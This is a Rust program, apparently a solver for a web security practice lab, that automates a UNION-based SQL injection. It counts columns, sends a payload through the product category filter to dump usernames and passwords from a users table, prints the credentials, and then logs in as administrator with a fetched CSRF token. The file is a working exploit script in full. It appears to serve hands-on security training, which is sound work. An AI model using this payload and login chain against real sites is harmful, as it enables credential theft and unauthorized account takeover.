use scraper::{Html, Selector};
use sql_injection::{
    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, check_is_lab_solved, find_columns_of_type_string,
    find_no_of_columns, generate_clap_parser, get_csrf_token,
};
use std::{collections::HashMap, sync::LazyLock};

static TABLE_TH_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
    Selector::parse("table tbody tr th").expect("Failed to construct the TABLE_TH_SELECTOR")
});

static TABLE_TD_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
    Selector::parse("table tbody tr td").expect("Failed to construct the TABLE_TD_SELECTOR")
});

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    let lab_url_with_endpoint = format!("{lab_url}/filter?category=");

    let columns = find_no_of_columns(&lab_url_with_endpoint, None);

    find_columns_of_type_string(&lab_url_with_endpoint, columns, None);

    logger::info("Fetching the `username` and `password` columns from `users` table");
    logger::info(
        format!(
            "Making query: {}/filter?category=' UNION SELECT username, password FROM users--",
            lab_url
        )
        .as_ref(),
    );

    let response = HTTP_CLIENT
        .get(format!(
            "{}/filter?category=' UNION SELECT username, password FROM users--",
            lab_url
        ))
        .send()
        .expect("[-] ");

    if response.status() == 200 {
        let document = Html::parse_document(
            response
                .text()
                .expect("[-] Failed to extract the body")
                .as_ref(),
        );

        let usernames: Vec<String> = document
            .select(&TABLE_TH_SELECTOR)
            .flat_map(|element_ref| element_ref.text())
            .map(str::to_string)
            .collect();

        let passwords: Vec<String> = document
            .select(&TABLE_TD_SELECTOR)
            .flat_map(|element_ref| element_ref.text())
            .map(str::to_string)
            .collect();

        let users_hashmap: HashMap<String, String> = usernames.into_iter().zip(passwords).collect();

        logger::success("Credentials found in the `users` table:");

        println!();
        for (username, password) in users_hashmap.iter() {
            println!("{}:{}", username, password);
        }
        println!();

        if users_hashmap.contains_key("administrator") {
            logger::info("Now logging in as administrator");
            logger::info("Getting the login page CSRF TOKEN");

            // Making a GET request to the login page
            let response = HTTP_CLIENT
                .get(format!("{lab_url}/login"))
                .send()
                .expect("[-] Failed to fetch the login page");

            let login_page_csrf_token = get_csrf_token(
                response
                    .text()
                    .expect("[-] Failed to extract login page body")
                    .as_str(),
                &LOGIN_CSRF_TOKEN_SELECTOR,
            );

            logger::success(format!("Login Page CSRF Token: {}", login_page_csrf_token).as_ref());
            logger::info("Performing the login bypass");

            if HTTP_CLIENT
                .post(format!("{}/login", lab_url))
                .form(&[
                    ("csrf", login_page_csrf_token),
                    ("username", "administrator".to_string()),
                    (
                        "password",
                        users_hashmap.get("administrator").unwrap().to_string(),
                    ),
                ])
                .send()
                .expect("[-] Failed to login as administrator")
                .status()
                == 200
            {
                logger::success("Login succesfully as administrator");
            } else {
                logger::error("Failed to login as administrator");
            }
        } else {
            panic!(
                "{}",
                logger::error_return("administrator credential not found")
            );
        }
    } else {
        panic!(
            "{}",
            logger::error_return("Failed to fetch the usernames and passwords")
        );
    }

    check_is_lab_solved(lab_url);
}
